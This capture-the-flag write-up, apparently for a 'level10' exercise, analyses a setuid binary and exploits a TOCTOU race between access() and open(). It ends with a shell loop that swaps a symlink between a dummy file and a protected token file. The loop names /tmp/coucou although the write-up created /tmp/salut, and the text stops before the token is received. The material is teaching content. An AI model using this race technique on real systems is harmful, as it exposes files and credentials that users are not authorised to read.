## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

We have a binary setuid and a token file with no rights for us. 
Let's do some tests

```bash 
$ ./level10 
./level10 file host
        sends file to host if you have access to it
```

The program seems to send a file to an address. 

```bash 
$ ./level10 token coucou
You don't have access to token
```

Okay let's ty with a file that we create

```bash 
$ echo 'salut' > /tmp/salut.txt
$ ./level10 /tmp/salut.txt level10
Connecting to level10:6969 .. Unable to connect to host level10
```

Okay no rights issue if it is our file. Let's look at the program with strings

```bash 
$  strings ./level10 
[...]
open
access
[...]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
```



The executable checks if we have the rights to read the file with the access function then tries to send it to a server and display its content but we do not have the necessary rights on the token file.


We learned more about 'access' and discovered the existence of  <a href='https://www.vpnunlimited.com/fr/help/cybersecurity/toctou-attack?srsltid=AfmBOoqehRSAC5_nVvLKZinLmwohL_LoSgNh-VZIJcej7_UG0dA6EeZg'>TOCTOU attacks</a>, wich is pretty well explained in the manual. It is exactly like race conditions in philosphers. 


```bash 
NOTES
Warning:  Using  access()  to  check  if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate  it.   For  this reason,  the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

What we want to do is that the access happens on a file where we have the rights and the open on the token. Let's first create the file. 

```bash 
$ echo 'salut' > /tmp/salut
```

Thn we are going to need a 'faketoken' file, which will be a link once to the token to read it and another time a link to '/tmp/salut' to pass the rights check. 

Since all this happens very fast we will have to do it in a infinite loop. 

```bash 
while true; do
    # Création d'un lien symbolique /tmp/faketoken pointant vers /tmp/coucou
    ln -sf /tmp/coucou /tmp/faketoken

    # Création d'un lien symbolique /tmp/faketoken pointant vers $(pwd)/token
    ln -sf $(pwd)/token /tmp/faketoken
done &
```










